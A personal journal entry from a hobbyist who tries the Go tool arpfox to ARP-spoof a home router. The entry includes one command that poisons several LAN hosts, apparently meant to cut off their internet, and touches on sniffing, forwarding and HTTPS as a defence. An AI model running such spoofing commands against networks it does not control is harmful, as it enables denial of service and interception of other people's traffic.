# June 20th 2020

Today as usual I was thinking what to do. Long ago I was trying out arp spoof
attack, for which I was checking out existing tools, especially in golang,
since the tools that I used when I was young was mostly C/C++ I think and part
of the packages present in kali linux OS. And I'm on Mac OS currently, and I
wanted to also see if I could build a tool. It's fun you know.

So, I found quite some tools I think. One of them was `arpfox`. Whenever I tried
the tools, I failed at using them. I didn't know what it was doing. And gave up
very soon. Today I was thinking if I should build a tool already or try using
`arpfox` again.

Fortunately I tried again, and properly this time, after skimming the readme.
There was a really nice practical example in it which explained stuff.

My idea was to basically just block Internet by routing the traffic from all
devices to my device by masquerading my device as the router, using arp spoof
by saying the router's IP address has my MAC address and not the actual router
MAC address. This is what I did:

```bash
$ sudo arpfox -t 192.168.1.1-4 192.168.1.1 -w 0.1

And the example also told how to sniff the packets coming to the machine and
how to forward them to the real machine that was intended to get the packet
and it also spoke about how to prevent such attacks - of course by using
encrypted communications, for example using HTTPS, so that most of the content
is not known to the sniffer, but they might know some basic metadata about the
communications, possible.

I was also checking the code a bit. Just the file names, imports and stuff.
Noticed that it uses some OS specific stuff and then some general stuff.
They used the google's library `gopacket` - https://github.com/google/gopacket

I think it will be nice to checkout the complete code sometime.

From what I can see, with arpfox, as a user, I cannot make some other host in
the network masquerade as some random host in the network. I can only make my
computer masquerade as some random host in the network. But I guess it shouldn't
be that tough to implement it with the given code. I might try it sometime.

Let's see. Also, I could probably see other kind of spoofing attacks too! :)
Idk what else is out there, like DNS Spoof? I'll have to check it out.
